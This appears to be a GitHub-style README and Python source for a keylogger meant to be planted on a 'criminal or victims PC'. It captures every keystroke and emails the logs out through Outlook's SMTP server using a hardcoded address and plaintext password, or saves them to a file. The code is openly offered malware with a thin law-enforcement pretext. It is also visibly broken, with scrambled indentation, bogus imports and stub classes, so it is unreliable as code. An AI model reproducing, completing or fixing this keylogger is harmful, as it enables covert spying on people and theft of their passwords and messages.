# FacebookShortcut
Plant's a key logger on a criminal or victims PC. DO NOT RUN ON YOUR OWN SYSTEM.

This code needs to be fixed, I don't believe this is working on my system (I tested it on my own system). Law Enforcement Agencies, please feel free to update the code, then send me your edits.

"""Welcome to the Surveillance System program Keylogger."""

"""This script is designed and programmed by Nickolas De Been (yes, you pronounce
the whole surname as a single word in case your wondering) to spy on the inputs of users
it is used against, such as criminals for example."""

"""If you have any inquiries, please contact me at boesoul23@gmail.com, and I'll send you an
updated copy of this script."""

"""WARNING: USE THIS AT YOUR OWN RISK!"""

"""Hacking of any nature is illegal unless your following the regulations of the law in the
country in which you live."""

"""I am not responsible for any damage you do to a person's device, or your own device 
for this matter."""

"""Do not direct complaints towards me in any fashion if you indeed damage your device
(looking at you, Europe XD)."""

import interval as interval
import self as self
import keyboard

"""For keyloggers when the keyboard is used"""

import smtplib

"""For sending an email or emails using the SMTP protocol (Outlook)."""

"""Timer is to make a method of runs after an `interval` amount of time."""

from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 300
EMAIL_ADDRESS = "nickdebeen19@outlook.com"
EMAIL_PASSWORD = "GetFucked2022!"


class Timer:
    def start(self):
        pass


class Keylogger:
    def __init__(self, interval, report_method='email'):

        """You will receive a report every 300 seconds, I would advise creating a separate folder
        in your inbox for these."""

        self.report_method = report_method
        self.interval = interval

    self.interval = interval
    self.report_method = self.report_method

    """This is the string variable that contains the log of every keystroke within
    'self.interval'."""

    self.log = ""

    """Recording start and end dates and times."""

    self.start_dt = datetime.now()
    self.end_dt = datetime.now()

    def callback(self, event):

        """This callback is invoked whenever a keyboard event has occurred
        (i.e., when a key is released in this example
        """

        name = event.name
        if len(name) > 1:
            # 'Is not a character, but a special key (ctrl, alt, shift, etc).'
            # 'Uppercase with [].'
            if name == "space":
                # " " is used instead of space
                name = " "
            elif name == 'enter':
                # 'Adds a new line when the Enter key is pressed.'
                name = "[ENTER\n"
            elif name == "decimal":
                name = "."
            else:
                # 'Replace spaces with underscores.'
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        """Finally, we will be adding the key name to our global `self.log` variable."""

        self.log += name

    def update_filename(self):

        """Construct the filename needed to be identified by the start and end times."""

    start_dt_str = str(self.start_dt)[:-7].replace(" ", "_").replace(":", "")
    end_dt_str = str(self.start_dt)[:-7].replace(" ", "_").replace(":", "")
    self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):

        """This method creates a log file in the current directory that contains the current
        key logs in the `self.log` variable"""

        """Opens the file in 'Write' mode (you'll need to create this)."""

        with open(f"{self.filename}.txt", "W", ) as f:

            """Writes the key logs to the file."""

            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

        def prepare_mail(self, message):

            """Utility function to construct a MIMEMultipart from a text.
            It creates an HTML version of the file, along with the text file,
            of which is as an email."""

            msg = MIMEMultipart("alternative")
            msg["From"] = EMAIL_ADDRESS
            msg["To"] = EMAIL_ADDRESS
            msg["Subject"] = "Keylogger Logs"

            """This was a simple paragraph, so, please feel free to edit."""

            html = f"<p>{message}</p>"
            text_part = MIMEText(message, "plain")
            html_part = MIMEText(html, "html")
            msg.attach(text_part)
            msg.attach(html_part)

            """After typing out the mail, the script will convert back anything in the log as a
                string message."""

            return msg.as_string()

        def sendmail(self, email, password, message, verbose=1):

            """This manages a connection to an SMTP Server, in our case though, it is for
            Microsoft 365, Outlook, Hotmail, and live.com."""

            server = smtplib.SMTP(host="smtp.office365.com", port=587)

            """We will connect the SMTP server as TLS mode for security reasons."""

            server.starttls()

            """The script will login to the email address you have provided."""

            server.login(email, password)

            """The script will send the actual message to you, telling you its ready to start."""

            server.sendmail(email, email, self.prepare_mail(message))

            """After the script has completed its duty, it will terminate."""

            server.quit()
            if verbose:
                print(f"{datetime.now()}) -Sent an email to {email} containing: {message}")

                def report(self):
                    """This function will be called at every `self.interval`,
                    and basically sends all key logs, then resets the `self.log` variable.
                    :type self: object"""
                    if self.log:
                        """If there is something in the log, the script will report it once its finished
                        logging."""

                        self.end_dt = datetime.now()

                        """The script will subsequently update its `self.filename`."""

                        self.update_filename()

                    if self.report_method == "email":
                        self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
                    elif self.report_method == "file":
                        self.report_to_file()

                        """If you don't wish for the output of your suspect or victim to be printed in
                        the console, you can comment out the below line."""

                        print(f"[{self.filename}] - {self.log}")
                        self.start_dt = datetime.now()
                    self.log = ""
                    timer = Timer()

                    """The script sets the thread as daemon, but dies if the main thread does."""

                    timer.daemon = True

                    """The script will start the timer."""

                    timer.start()

                    def start(self):

                        """The script records the starting datetime."""

                        self.start_dt = datetime.now()

                        """The script then starts the key logger."""

                        keyboard.on_release(callback=self.callback)

                        """The script starts reporting key presses."""

                        self.report()

                        """The script makes a simple message."""

                        print(f"{datetime.now()} - Started key logger")

                        """The script blocks the current thread, then waits until CTRL+C is pressed"""

                        keyboard.wait()

                        if __name__ == "__main__":
                            """If you'd like the key logger to send to your email,
                            uncomment the below line:"""

                            """keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email)"""

                            """If you'd like the key logger to record key logs to a file, then
                            use your favorite sending method to save it:"""

                            keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")

                            keylogger.start()

    def start(self):
        pass
